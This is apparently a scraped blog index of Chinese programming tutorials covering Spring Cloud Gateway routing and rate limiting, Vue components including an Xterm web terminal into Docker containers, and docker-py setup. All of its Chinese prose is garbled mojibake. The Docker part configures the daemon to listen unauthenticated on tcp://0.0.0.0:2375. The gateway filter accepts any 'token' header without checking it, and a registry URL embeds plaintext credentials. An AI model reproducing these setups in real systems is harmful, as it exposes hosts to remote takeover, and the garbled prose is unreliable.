&lt;version&gt;2.6.2&lt;/version&gt; &lt;relativePath/&gt; &lt;!-- lookup parent from repository --&gt; &lt;/parent&gt; &lt;groupId&gt;com.qfedu&lt;/groupId&gt; &lt;artifactId&gt;gateway&lt;/artifactId&gt; &lt;version&gt;2.1.1&lt;/version&gt; &lt;name&gt;gateway&lt;/name&gt; &lt;description&gt;Demo project for Spring Boot&lt;/description&gt; &lt;properties&gt; &lt;java.version&gt;1.8&lt;/java.version&gt; &lt;spring-cloud.version&gt;2021.0.3&lt;/spring-cloud.version&gt; &lt;/properties&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-webflux&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-gateway&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;io.projectreactor&lt;/groupId&gt; &lt;artifactId&gt;reactor-test&lt;/artifactId&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;/dependencies&gt; &lt;dependencyManagement&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-dependencies&lt;/artifactId&gt; &lt;version&gt;$&#123;spring-cloud.version&#125;&lt;/version&gt; &lt;type&gt;pom&lt;/type&gt; &lt;scope&gt;import&lt;/scope&gt; &lt;/dependency&gt; &lt;/dependencies&gt; &lt;/dependencyManagement&gt; &lt;build&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt; &lt;/plugin&gt; &lt;/plugins&gt; &lt;/build&gt; &lt;/project&gt; åœ¨application.ymlä¸­é…ç½®ç›¸å…³ä¿¡æ¯ server: port: 8000 spring: application: name: gateway cloud: gateway: routes: - id: api-service uri: http://127.0.0.1:8001 predicates: - Path=/user/login - id: api-service uri: http://127.0.0.1:8002 predicates: - Path=/user/regist å®ç°å…¨å±€è¿‡æ»¤å™¨ å½“ç”¨æˆ·è®¿é—®8000ç«¯å£æ—¶ï¼Œæ‰€æœ‰çš„è¯·æ±‚éƒ½ä¼šè¢«è¯¥è¿‡æ»¤å™¨æ‹¦æˆª å› æ­¤å…¨å±€è¿‡æ»¤å™¨å¯ä»¥è¿›è¡Œæƒé™éªŒè¯ package com.qfedu.gateway.filter; import org.springframework.cloud.gateway.filter.GatewayFilterChain; import org.springframework.cloud.gateway.filter.GlobalFilter; import org.springframework.core.Ordered; import org.springframework.http.HttpStatus; import org.springframework.stereotype.Component; import org.springframework.web.server.ServerWebExchange; import reactor.core.publisher.Mono; import java.util.List; @Component public class MyGlobalFilter implements GlobalFilter, Ordered &#123; @Override public Mono&lt;Void&gt; filter(ServerWebExchange exchange, GatewayFilterChain chain) &#123; System.out.println(&quot;-------------------&quot;); System.out.println(&quot;è¿›å…¥å…¨å±€è¿‡æ»¤å™¨&quot;); List&lt;String&gt; token = exchange.getRequest().getHeaders().get(&quot;token&quot;); if(token != null &amp;&amp; token.size() &gt; 0)&#123; // å¯¹tokenè¿›è¡ŒéªŒè¯ï¼Œå¦‚æœéªŒè¯é€šè¿‡åˆ™æ”¾è¡Œæœ¬æ¬¡æ‹¦æˆª return chain.filter(exchange); &#125;else &#123; // éªŒè¯ä¸é€šè¿‡ï¼Œåˆ™è¿”å›å¯¹åº”çš„çŠ¶æ€ç  exchange.getResponse().setStatusCode(HttpStatus.UNAUTHORIZED); // æ‹¦æˆªè¯·æ±‚ return exchange.getResponse().setComplete(); &#125; &#125; @Override public int getOrder() &#123; return 0; &#125; &#125; åŠ¨æ€è·¯ç”±é…ç½® ä½¿ç”¨æœåŠ¡æ³¨å†Œä¸å‘ç°å®ç°åŠ¨æ€è·¯ç”± å°†gatewayæœåŠ¡æ¨¡å—åŠ å…¥åˆ°eurekaä¸­ï¼Œå³æ·»åŠ ä¾èµ–æ·»åŠ é…ç½®æ–‡ä»¶ eureka: client: service-url: defaultZone: http://sunzy:111111@127.0.0.1:8761/eureka ä½¿ç”¨æ³¨å†Œåˆ°eurekaä¸­çš„æœåŠ¡åæ›¿æ¢ipåœ°å€ lbä»£è¡¨ä½¿ç”¨è´Ÿè½½å‡è¡¡æ¨¡å¼ï¼Œé»˜è®¤ç­–ç•¥æ—¶è½®è¯¢ server: port: 8000 spring: application: name: gateway main: web-application-type: reactive cloud: gateway: routes: - id: api-login uri: lb://api-user-login #uri: http://127.0.0.1:8001 predicates: - Path=/user/login - id: api-regist uri: lb://api-user-regist predicates: - Path=/user/regist eureka: client: service-url: defaultZone: http://sunzy:111111@127.0.0.1:8761/eureka Gatewayé™æµ åŸºäºä»¤ç‰Œæ¡¶å®ç°çš„ç½‘å…³é™æµï¼Œä½¿ç”¨redisä½œä¸ºæ¡¶ç»“åˆè¿‡æ»¤å™¨å®ç°é™æµ æ·»åŠ ä¾èµ– &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-data-redis-reactive&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.commons&lt;/groupId&gt; &lt;artifactId&gt;commons-pool2&lt;/artifactId&gt; &lt;version&gt;2.9.0&lt;/version&gt; &lt;/dependency&gt; é…ç½®application.yml server: port: 8000 spring: application: name: gateway main: web-application-type: reactive cloud: gateway: routes: - id: api-login uri: http://127.0.0.1:8001 # uri: lb://api-user-login predicates: - Path=/user/login #é™æµç­–ç•¥é…ç½® filters: - name: RequestRateLimiter args: redis-rate-limiter.replenishRate: 1 #ä»¤ç‰Œæ¡¶æ¯sçš„å¡«å……é€Ÿåº¦ redis-rate-limiter.burstCapacity: 2 # ä»¤ç‰Œæ¡¶å®¹é‡ redis-rate-limiter.requestedTokens: 1 key-resolver: &quot;#&#123;@keyResolver&#125;&quot; - id: api-regist uri: lb://api-user-regist predicates: - Path=/user/regist redis: host: 127.0.0.1 port: 6379 database: 0 password: # lettuce: # pool: # max-active: 10 # max-wait: 1000 # max-idle: 5 # min-idle: 3 eureka: client: service-url: defaultZone: http://sunzy:111111@127.0.0.1:8761/eureka é…ç½®keyResolver package com.qfedu.gateway.config; import org.springframework.cloud.gateway.filter.ratelimit.KeyResolver; import org.springframework.context.annotation.Bean; import org.springframework.context.annotation.Configuration; import reactor.core.publisher.Mono; @Configuration public class AppConfig &#123; @Bean public KeyResolver keyResolver() &#123; //http://localhost:9999/order/query?user=1 //ä½¿â½¤è¯·æ±‚ä¸­çš„userå‚æ•°çš„å€¼ä½œä¸ºä»¤ç‰Œæ¡¶çš„key //return exchange -&gt;Mono.just(exchange.getRequest().getQueryParams().getFirst(&quot;user&quot;)); return exchange -&gt; Mono.just(exchange.getRequest().getURI().getPath()); &#125; &#125; å½“ç”¨æˆ·è®¿é—®çš„é€Ÿåº¦è¶…è¿‡äº†ä»¤ç‰Œçš„äº§ç”Ÿé€Ÿåº¦æ—¶å°±ä¼šæ— æ³•è®¿é—®ï¼Œè¿”å›429çš„çŠ¶æ€ç ","tags":[]},{"title":"vue_component","date":"2022-05-26T07:03:25.000Z","path":"2022/05/26/vue-component/","text":"Vueç»„ä»¶åšé¡¹ç›®ä¸­ä½¿ç”¨åˆ°çš„vueç»„ä»¶ï¼Œè®°å½•ä¸€ä¸‹ï¼Œä»¥åä½¿ç”¨åˆ°æ—¶ç›´æ¥å¤åˆ¶å³å¯ Element UIè¿›å…¥é¡¹ç›®ç›®å½•ï¼Œå®‰è£…ä¾èµ–npm install element-ui -S å®‰è£…æˆåŠŸåï¼ŒæŸ¥çœ‹é…ç½®æ–‡ä»¶package.jsonï¼Œæ˜¯å¦æœ‰element-uiç»„ä»¶çš„ç‰ˆæœ¬å· å¦‚ä¸‹å›¾ï¼š åœ¨main.jsæ–‡ä»¶ä¸­ å¼•å…¥ element ç»„ä»¶import ElementUI from &#x27;element-ui&#x27;; import &#x27;element-ui/lib/theme-chalk/index.css&#x27;; Vue.use(ElementUI, &#123; size: &quot;mini&quot; &#125;); å®Œæˆä»¥ä¸Šä¸¤ä¸ªæ­¥éª¤ï¼Œå³å¯åœ¨é¡¹ç›®ä¸­ä½¿ç”¨element-uiæä¾›çš„ç»„ä»¶äº† Echartså®‰è£…ä¾èµ–npm install echarts -S å¦‚æœä¸åŠ ç‰ˆæœ¬å·åˆ™é»˜è®¤å®‰è£…æœ€æ–°ç‰ˆ npm install echarts@5.3.2 -S æ·»åŠ ç‰ˆæœ¬å·ï¼Œå¯ä»¥å®‰è£…æŒ‡å®šç‰ˆæœ¬çš„ä¾èµ–åŒ…ï¼Œå¦‚å›¾æ‰€ç¤ºã€‚ åœ¨vueæ–‡ä»¶ä¸­ä½¿ç”¨Echarts åˆ›å»ºdomç»„ä»¶&lt;div id=&quot;pie&quot; style=&quot;width: 500px; height: 400px&quot;&gt;&lt;/div&gt; åˆå§‹åŒ–å›¾è¡¨æ•°æ®var pieOption = &#123; title: &#123; text: &#x27;å„å­£åº¦ä¼šå‘˜æ•°é‡ç»Ÿè®¡&#x27;, subtext: &#x27;æ¯”ä¾‹å›¾&#x27;, left: &#x27;center&#x27; &#125;, tooltip: &#123; trigger: &#x27;item&#x27; &#125;, legend: &#123; orient: &#x27;vertical&#x27;, left: &#x27;left&#x27; &#125;, series: [ &#123; type: &#x27;pie&#x27;, radius: &#x27;60%&#x27;, label:&#123; //é¥¼å›¾å›¾å½¢ä¸Šçš„æ–‡æœ¬æ ‡ç­¾ normal:&#123; show:true, position:&#x27;inner&#x27;, //æ ‡ç­¾çš„ä½ç½® textStyle : &#123; fontWeight : 300 , fontSize : 14, //æ–‡å­—çš„å­—ä½“å¤§å° color: &quot;#fff&quot; &#125;, formatter:&#x27;&#123;d&#125;%&#x27; &#125; &#125;, data: [], // å¡«ç©º emphasis: &#123; itemStyle: &#123; shadowBlur: 10, shadowOffsetX: 0, shadowColor: &#x27;rgba(0, 0, 0, 0.5)&#x27; &#125; &#125; &#125; ] &#125;; var pieDom = document.getElementById(&#x27;pie&#x27;); var pieChart = echarts.init(pieDom); å…¶ä¸­data: [],æ˜¯è¡¨æ ¼æ˜¾ç¤ºçš„æ•°æ®ï¼Œè¿™é‡Œæ˜¯éœ€è¦é‡ç‚¹å®ç°çš„ è¿™é‡Œå¯ä»¥åœ¨å‰ç«¯é¡µé¢ä¸­å†™æ­»æ•°æ®ï¼Œä½†æ˜¯å¤§å¤šéœ€è¦è¯·æ±‚åç«¯æ¥å£è·å–æ•°æ®ï¼Œå¦‚ä¸‹ this.request.get(&quot;/echarts/members&quot;).then(res =&gt;&#123; pieOption.series[0].data = [ &#123;name: &quot;ç¬¬ä¸€å­£åº¦&quot;, value: res.data[0]&#125;, &#123;name: &quot;ç¬¬äºŒå­£åº¦&quot;, value: res.data[1]&#125;, &#123;name: &quot;ç¬¬ä¸‰å­£åº¦&quot;, value: res.data[2]&#125;, &#123;name: &quot;ç¬¬å››å­£åº¦&quot;, value: res.data[3]&#125;, ] pieChart.setOption(pieOption); &#125; å®ç°æ•ˆæœå›¾ Xtermæ¯•ä¸šè®¾è®¡ä¸­å®ç°äº†åœ¨ç½‘é¡µä¸­è¿›å…¥å®¹å™¨å†…å®¹ï¼Œä¹Ÿå°±æ˜¯docker exec -it containerId bashåŠŸèƒ½ ä¸webSHHåŠŸèƒ½ç±»ä¼¼ å®‰è£…ä¾èµ–npm install xterm -S å®‰è£…ä½¿ç”¨åˆ°çš„æ’ä»¶ npm install xterm-addon-attach -S npm install xterm-addon-fit -S æœ¬æ–‡ä½¿ç”¨çš„ç‰ˆæœ¬å¦‚ä¸‹ åœ¨é¡µé¢ä¸­å¯¼å…¥ä½¿ç”¨åˆ°çš„åŒ…import &quot;xterm/css/xterm.css&quot;; import &#123; Terminal &#125; from &quot;xterm&quot;; import &#123; FitAddon &#125; from &quot;xterm-addon-fit&quot;; import &#123; AttachAddon &#125; from &quot;xterm-addon-attach&quot;; å‰ç«¯æ‰€æœ‰ä»£ç å¦‚ä¸‹ &lt;template&gt; &lt;div class&#x3D;&quot;app-container&quot;&gt; &lt;el-row &gt; &lt;h1&gt;Web Console&lt;&#x2F;h1&gt; &lt;div id&#x3D;&quot;log&quot; style&#x3D;&quot;margin-top:20px;&quot;&gt; &lt;div class&#x3D;&quot;xterm&quot; id&#x3D;&quot;terminal&quot;&gt;&lt;&#x2F;div&gt; &lt;&#x2F;div&gt; &lt;&#x2F;el-row&gt; &lt;&#x2F;div&gt; &lt;&#x2F;template&gt; &lt;script&gt; import &quot;xterm&#x2F;css&#x2F;xterm.css&quot;; import &#123; Terminal &#125; from &quot;xterm&quot;; import &#123; FitAddon &#125; from &quot;xterm-addon-fit&quot;; import &#123; AttachAddon &#125; from &quot;xterm-addon-attach&quot;; export default &#123; components: &#123;&#125;, props: &#123; socketURI: &#123; type: String, default: &quot;&quot; &#125; &#125;, data() &#123; return &#123; term: null, socket: null, rows: 40, &#x2F;&#x2F; cols: 10, webSocketUrl: &#39;&#39;, &#x2F;&#x2F;&quot;ws:&#x2F;&#x2F;127.0.0.1:8081&#x2F;terminal?workdir&#x3D;&#x2F;&amp;container&#x3D;5e0647ee611b&quot;, SetOut: false, isKey: false &#125; &#125;, computed: &#123;&#125;, watch: &#123;&#125;, created() &#123; const id &#x3D; this.$route.query.id console.log(id) this.webSocketUrl &#x3D; &quot;ws:&#x2F;&#x2F;127.0.0.1:8081&#x2F;terminal?workdir&#x3D;&#x2F;&amp;container&#x3D;&quot; + id &#125;, mounted() &#123; this.initSocket(); &#125;, beforeDestroy() &#123; this.socket.close(); &#x2F;&#x2F; this.term.dispose(); &#125;, methods: &#123; submitForm() &#123; this.$refs[&#39;elForm&#39;].validate(valid &#x3D;&gt; &#123; if (!valid) return &#x2F;&#x2F; TODO æäº¤è¡¨å• &#125;) &#125;, resetForm() &#123; this.$refs[&#39;elForm&#39;].resetFields() &#125;, &#x2F;&#x2F;Xtermä¸»é¢˜ initTerm(data, callback) &#123; const term &#x3D; new Terminal(&#123; rendererType: &quot;canvas&quot;, &#x2F;&#x2F;æ¸²æŸ“ç±»å‹ rows: this.rows, &#x2F;&#x2F;è¡Œæ•° &#x2F;&#x2F; cols: this.cols,&#x2F;&#x2F; è®¾ç½®ä¹‹åä¼šè¾“å…¥å¤šè¡Œä¹‹åè¦†ç›–ç°è±¡ convertEol: true, &#x2F;&#x2F;å¯ç”¨æ—¶ï¼Œå…‰æ ‡å°†è®¾ç½®ä¸ºä¸‹ä¸€è¡Œçš„å¼€å¤´ &#x2F;&#x2F; scrollback: 10,&#x2F;&#x2F;ç»ˆç«¯ä¸­çš„å›æ»šé‡ fontSize: 14, &#x2F;&#x2F;å­—ä½“å¤§å° disableStdin: false, &#x2F;&#x2F;æ˜¯å¦åº”ç¦ç”¨è¾“å…¥ã€‚ cursorStyle: &quot;block&quot;, &#x2F;&#x2F;å…‰æ ‡æ ·å¼ cursorBlink: true, &#x2F;&#x2F;å…‰æ ‡é—ªçƒ scrollback: 30, tabStopWidth: 8, theme: &#123; foreground: &quot;green&quot;, &#x2F;&#x2F;å­—ä½“ background: &quot;#000000&quot;, &#x2F;&#x2F;èƒŒæ™¯è‰² cursor: &quot;help&quot; &#x2F;&#x2F;è®¾ç½®å…‰æ ‡ &#125; &#125;); const attachAddon &#x3D; new AttachAddon(this.socket); const fitAddon &#x3D; new FitAddon(); term.loadAddon(attachAddon); term.loadAddon(fitAddon); term.open(document.getElementById(&quot;terminal&quot;)); fitAddon.fit(); term.focus(); let _this &#x3D; this; &#x2F;&#x2F;é™åˆ¶å’Œåç«¯äº¤äº’ï¼Œåªæœ‰è¾“å…¥å›è½¦é”®æ‰æ˜¾ç¤ºç»“æœ term.prompt &#x3D; () &#x3D;&gt; &#123; term.write(&quot;\\r\\n$ &quot;); &#125;; term.prompt(); function runFakeTerminal(_this) &#123; if (term._initialized) &#123; return; &#125; &#x2F;&#x2F; åˆå§‹åŒ– term._initialized &#x3D; true; term.writeln();&#x2F;&#x2F;æ§åˆ¶å°åˆå§‹åŒ–æŠ¥é”™å¤„ term.prompt(); &#x2F;&#x2F; &#x2F; ** &#x2F;&#x2F; *æ·»åŠ äº‹ä»¶ç›‘å¬å™¨ï¼Œç”¨äºæŒ‰ä¸‹é”®æ—¶çš„äº‹ä»¶ã€‚äº‹ä»¶å€¼åŒ…å« &#x2F;&#x2F; *å°†åœ¨dataäº‹ä»¶ä»¥åŠDOMäº‹ä»¶ä¸­å‘é€çš„å­—ç¬¦ä¸² &#x2F;&#x2F; *è§¦å‘äº†å®ƒã€‚ &#x2F;&#x2F; * @è¿”å›ä¸€ä¸ªIDisposableåœæ­¢ç›‘å¬ã€‚ &#x2F;&#x2F; * &#x2F; &#x2F;&#x2F; &#x2F; ** æ›´æ–°ï¼šxterm 4.xï¼ˆæ–°å¢ï¼‰ &#x2F;&#x2F; *ä¸ºæ•°æ®äº‹ä»¶è§¦å‘æ—¶æ·»åŠ äº‹ä»¶ä¾¦å¬å™¨ã€‚å‘ç”Ÿè¿™ç§æƒ…å†µ &#x2F;&#x2F; *ç”¨æˆ·è¾“å…¥æˆ–ç²˜è´´åˆ°ç»ˆç«¯æ—¶çš„ç¤ºä¾‹ã€‚äº‹ä»¶å€¼ &#x2F;&#x2F; *æ˜¯&#96;string&#96;ç»“æœçš„ç»“æœï¼Œåœ¨å…¸å‹çš„è®¾ç½®ä¸­ï¼Œåº”è¯¥é€šè¿‡ &#x2F;&#x2F; *åˆ°æ”¯æŒptyã€‚ &#x2F;&#x2F; * @è¿”å›ä¸€ä¸ªIDisposableåœæ­¢ç›‘å¬ã€‚ &#x2F;&#x2F; * &#x2F; &#x2F;&#x2F; æ”¯æŒè¾“å…¥ä¸ç²˜è´´æ–¹æ³• term.onData(function(key) &#123; let order &#x3D; &#123; Data: key, Op: &quot;stdin&quot; &#125;; _this.onSend(order); &#125;); _this.term &#x3D; term; &#125; runFakeTerminal(_this); &#125;, &#x2F;&#x2F;webShellä¸»é¢˜ initSocket() &#123; const WebSocketUrl &#x3D; this.webSocketUrl this.socket &#x3D; new WebSocket( WebSocketUrl ); this.socketOnClose(); &#x2F;&#x2F;å…³é—­ this.socketOnOpen(); &#x2F;&#x2F; this.socketOnError(); &#125;, &#x2F;&#x2F;webshellé“¾æ¥æˆåŠŸä¹‹åæ“ä½œ socketOnOpen() &#123; this.socket.onopen &#x3D; () &#x3D;&gt; &#123; &#x2F;&#x2F; é“¾æ¥æˆåŠŸå this.initTerm(); &#125;; &#125;, &#x2F;&#x2F;webshellå…³é—­ä¹‹åæ“ä½œ socketOnClose() &#123; this.socket.onclose &#x3D; () &#x3D;&gt; &#123; console.log(&quot;close socket&quot;); &#125;; &#125;, &#x2F;&#x2F;webshellé”™è¯¯ä¿¡æ¯ socketOnError() &#123; this.socket.onerror &#x3D; () &#x3D;&gt; &#123; console.log(&quot;socket é“¾æ¥å¤±è´¥&quot;); &#125;; &#125;, &#x2F;&#x2F;ç‰¹æ®Šå¤„ç† onSend(data) &#123; data &#x3D; this.base.isObject(data) ? JSON.stringify(data) : data; data &#x3D; this.base.isArray(data) ? data.toString() : data; data &#x3D; data.replace(&#x2F;\\\\\\\\&#x2F;, &quot;\\\\&quot;); this.shellWs.onSend(data); &#125;, &#x2F;&#x2F;åˆ é™¤å·¦å³ä¸¤ç«¯çš„ç©ºæ ¼ trim(str) &#123; return str.replace(&#x2F;(^\\s*)|(\\s*$)&#x2F;g, &quot;&quot;); &#125; &#125; &#125; &lt;&#x2F;script&gt; &lt;style&gt; &lt;&#x2F;style&gt; ä»¥å‰å‰ç«¯ä»£ç åŸºæœ¬ä¸éœ€è¦æ”¹åŠ¨ï¼Œåªéœ€è¦ä¿®æ”¹åç«¯çš„api this.webSocketUrl = &quot;ws://127.0.0.1:8081/terminal?workdir=/&amp;container=&quot; + id å°†è¯¥å‚æ•°ä¿®æ”¹ä¸ºåç«¯websocketæ¥å£å³å¯ä½¿ç”¨ vue-video-playerå®‰è£…ä¾èµ–npm install vue-video-player@5.0.2 -S åœ¨å•æ–‡ä»¶ä¸­ä½¿ç”¨é¦–å…ˆå¯¼å…¥ä¾èµ– import &#123; videoPlayer &#125; from &#x27;vue-video-player/src&#x27; import &#x27;video.js/dist/video-js.css&#x27; import &#x27;vue-video-player/src/custom-theme.css&#x27; export default &#123; name: &quot;VideoDetail&quot;, components: &#123; videoPlayer &#125;, ä¹‹å‰æ˜¯import &#123; videoPlayer &#125; from &#39;vue-video-player&#39; ï¼ŒæŠ¥é”™ä¿¡æ¯å¦‚ä¸‹ error in ./node_modules/vue-video-player/dist/vue-video-player.js Module not found: Error: Can&#x27;t resolve &#x27;videojs&#x27; in &#x27;E:\\Sunzh\\java\\admin_demo\\hello-world\\node_modules\\vue-video-player\\dist&#x27; ERROR in ./node_modules/vue-video-player/dist/vue-video-player.js Module not found: Error: Can&#x27;t resolve &#x27;videojs&#x27; in &#x27;E:\\Sunzh\\java\\admin_demo\\hello-world\\node_modules\\vue-video-player\\dist&#x27; @ ./node_modules/babel-loader/lib/index.js??clonedRuleSet-40[0].rules[0].use[0]!./node_modules/@vue/vue-loader-v15/lib/index.js??vue-loader-options!./src/views/Detail.vue?vue&amp;type=scr ipt&amp;lang=js&amp; 13:0-47 19:17-28 @ ./src/views/Detail.vue?vue&amp;type=script&amp;lang=js&amp; 1:0-212 1:228-231 1:233-442 1:233-442 @ ./src/views/Detail.vue 2:0-58 3:0-53 3:0-53 9:2-8 @ ./src/router/index.js 82:11-40 @ ./src/main.js 7:0-30 26:10-16 å®Œæ•´çš„å‰ç«¯ä»£ç  &lt;template&gt; &lt;div&gt; &lt;div class&#x3D;&#39;demo&#39;&gt; &lt;video-player class&#x3D;&quot;video-player-box&quot; ref&#x3D;&quot;videoPlayer&quot; :playsinline&#x3D;&quot;true&quot; :options&#x3D;&quot;playerOptions&quot;&gt; &lt;&#x2F;video-player&gt; &lt;&#x2F;div&gt; &lt;&#x2F;div&gt; &lt;&#x2F;template&gt; &lt;script&gt; import &#123; videoPlayer &#125; from &#39;vue-video-player&#x2F;src&#39; import &#39;video.js&#x2F;dist&#x2F;video-js.css&#39; import &#39;vue-video-player&#x2F;src&#x2F;custom-theme.css&#39; export default &#123; name: &quot;VideoDetail&quot;, components: &#123; videoPlayer &#125;, data() &#123; return &#123; &#x2F;&#x2F; id: this.$route.query.id, &#x2F;&#x2F; video: &#123;&#125;, playerOptions: &#123; playbackRates: [0.5, 1.0, 1.5, 2.0], &#x2F;&#x2F; å¯é€‰çš„æ’­æ”¾é€Ÿåº¦ autoplay: true, &#x2F;&#x2F; å¦‚æœä¸ºtrue,æµè§ˆå™¨å‡†å¤‡å¥½æ—¶å¼€å§‹å›æ”¾ã€‚ muted: false, &#x2F;&#x2F; é»˜è®¤æƒ…å†µä¸‹å°†ä¼šæ¶ˆé™¤ä»»ä½•éŸ³é¢‘ã€‚ loop: false, &#x2F;&#x2F; æ˜¯å¦è§†é¢‘ä¸€ç»“æŸå°±é‡æ–°å¼€å§‹ã€‚ preload: &#39;auto&#39;, &#x2F;&#x2F; å»ºè®®æµè§ˆå™¨åœ¨&lt;video&gt;åŠ è½½å…ƒç´ åæ˜¯å¦åº”è¯¥å¼€å§‹ä¸‹è½½è§†é¢‘æ•°æ®ã€‚autoæµè§ˆå™¨é€‰æ‹©æœ€ä½³è¡Œä¸º,ç«‹å³å¼€å§‹åŠ è½½è§†é¢‘ï¼ˆå¦‚æœæµè§ˆå™¨æ”¯æŒï¼‰ language: &#39;zh-CN&#39;, aspectRatio: &#39;16:9&#39;, &#x2F;&#x2F; å°†æ’­æ”¾å™¨ç½®äºæµç•…æ¨¡å¼ï¼Œå¹¶åœ¨è®¡ç®—æ’­æ”¾å™¨çš„åŠ¨æ€å¤§å°æ—¶ä½¿ç”¨è¯¥å€¼ã€‚å€¼åº”è¯¥ä»£è¡¨ä¸€ä¸ªæ¯”ä¾‹ - ç”¨å†’å·åˆ†éš”çš„ä¸¤ä¸ªæ•°å­—ï¼ˆä¾‹å¦‚&quot;16:9&quot;æˆ–&quot;4:3&quot;ï¼‰ fluid: true, &#x2F;&#x2F; å½“trueæ—¶ï¼ŒVideo.js playerå°†æ‹¥æœ‰æµä½“å¤§å°ã€‚æ¢å¥è¯è¯´ï¼Œå®ƒå°†æŒ‰æ¯”ä¾‹ç¼©æ”¾ä»¥é€‚åº”å…¶å®¹å™¨ã€‚ sources: [&#123; type: &quot;video&#x2F;mp4&quot;, &#x2F;&#x2F; ç±»å‹ src: &#39;&#39; &#x2F;&#x2F; urlåœ°å€ &#125;], poster: &#39;&#39;, &#x2F;&#x2F; å°é¢åœ°å€ notSupportedMessage: &#39;æ­¤è§†é¢‘æš‚æ— æ³•æ’­æ”¾ï¼Œè¯·ç¨åå†è¯•&#39;, &#x2F;&#x2F; å…è®¸è¦†ç›–Video.jsæ— æ³•æ’­æ”¾åª’ä½“æºæ—¶æ˜¾ç¤ºçš„é»˜è®¤ä¿¡æ¯ã€‚ controlBar: &#123; timeDivider: true, &#x2F;&#x2F; å½“å‰æ—¶é—´å’ŒæŒç»­æ—¶é—´çš„åˆ†éš”ç¬¦ durationDisplay: true, &#x2F;&#x2F; æ˜¾ç¤ºæŒç»­æ—¶é—´ remainingTimeDisplay: true, &#x2F;&#x2F; æ˜¯å¦æ˜¾ç¤ºå‰©ä½™æ—¶é—´åŠŸèƒ½ fullscreenToggle: true &#x2F;&#x2F; æ˜¯å¦æ˜¾ç¤ºå…¨å±æŒ‰é’® &#125; &#125; &#125; &#125;, created() &#123; let id &#x3D; this.$route.query.id &#x2F;&#x2F; this.playerOptions.sources[0].src &#x3D; &quot;http:&#x2F;&#x2F;vjs.zencdn.net&#x2F;v&#x2F;oceans.mp4&quot; this.request(&quot;&#x2F;file&#x2F;detail&#x2F;&quot; + id).then(res &#x3D;&gt; &#123; console.log(res.data) this.video &#x3D; res.data this.playerOptions.sources[0].src &#x3D; res.data.url &#125;) &#125;, methods: &#123;&#125; &#125; &lt;&#x2F;script&gt; &lt;style&gt; &lt;&#x2F;style&gt; éœ€è¦ä¿®æ”¹çš„ä½ç½®åªæœ‰this.playerOptions.sources[0].src å°†å‚æ•°æ¢æˆä½ çš„è§†é¢‘åœ°å€å³å¯ å®ç°æ•ˆæœå¦‚ä¸‹ å¯ä»¥è°ƒæ•´æ’­æ”¾é€Ÿåº¦ Markdown","tags":[{"name":"vue","slug":"vue","permalink":"https://sunzhengyu99.github.io/tags/vue/"}]},{"title":"dockerpy","date":"2022-05-15T05:44:10.000Z","path":"2022/05/15/dockerpy/","text":"Docker-pyä½¿ç”¨pythonç¬¬ä¸‰æ–¹åº“docker-pyæ“ä½œdocker docker-pyçš„åœ°å€ï¼šhttps://github.com/docker/docker-py é…ç½®ç¯å¢ƒ1.å®‰è£…docker-pyâ€‹ pipå®‰è£…å³å¯ï¼Œå®‰è£…æœ€æ–°ç‰ˆ pip install docker 2.é…ç½®dockeræœ¬æ–‡ä½¿ç”¨çš„æ˜¯Docker Desktopï¼Œdockerç‰ˆæœ¬æ˜¯20.10.12 dockerå¼€å¯è¿œç¨‹è®¿é—®å¯¹äºDocker Desktopæ¥è¯´ï¼Œå¼€å¯è¿œç¨‹è®¿é—®å¾ˆç®€å•ï¼Œåªéœ€è¦å†settingsä¸­é€‰ä¸­å¦‚ä¸‹é…ç½®é¡¹ å¯¹äºlinuxä¸­é…ç½®è¿œç¨‹è®¿é—®å°±ç¨å¾®éº»çƒ¦ä¸€ç‚¹ æ–¹æ³•ä¸€ åœ¨/usr/lib/systemd/system/docker.serviceï¼Œé…ç½®è¿œç¨‹è®¿é—®ã€‚ ä¸»è¦æ˜¯åœ¨[Service]è¿™ä¸ªéƒ¨åˆ†ï¼ŒåŠ ä¸Šä¸‹é¢ä¸¤ä¸ªå‚æ•° # vim /usr/lib/systemd/system/docker.service [Service] ExecStart= ExecStart=/usr/bin/dockerd -H tcp://0.0.0.0:2375 -H unix://var/run/docker.sock é‡å¯ systemctl daemon-reload systemctl restart docker æ–¹æ³•äºŒ ä¿®æ”¹daemon.jsonçš„é…ç½® vim /etc/docker/daemon.json &#123; &quot;hosts&quot;: [&quot;tcp://0.0.0.0:2375&quot;, &quot;unix:///var/run/docker.sock&quot;] &#125; â€œunix:///var/run/docker.sockâ€ï¼šunix socketï¼Œæœ¬åœ°å®¢æˆ·ç«¯å°†é€šè¿‡è¿™ä¸ªæ¥è¿æ¥ Docker Daemonã€‚â€œtcp://0.0.0.0:2375â€ï¼štcp socketï¼Œè¡¨ç¤ºå…è®¸ä»»ä½•è¿œç¨‹å®¢æˆ·ç«¯é€šè¿‡ 2375 ç«¯å£è¿æ¥ Docker Daemonã€‚ ä¿®æ”¹é…ç½®ä»¥å ç„¶åè®©dockeré‡æ–°è¯»å–é…ç½®æ–‡ä»¶,å¹¶é‡å¯dockeræœåŠ¡ systemctl daemon-reload systemctl restart docker æŸ¥çœ‹dockerè¿›ç¨‹ï¼š [root@slaver2 ~]# ps -ef|grep docker root 44221 1 1 18:16 ? 00:00:06 /usr/bin/dockerd -H tcp://0.0.0.0:2375 -H unix://var/run/docker.sock Dockerå®ˆæŠ¤è¿›ç¨‹æ‰“å¼€ä¸€ä¸ªHTTP Socket,è¿™æ 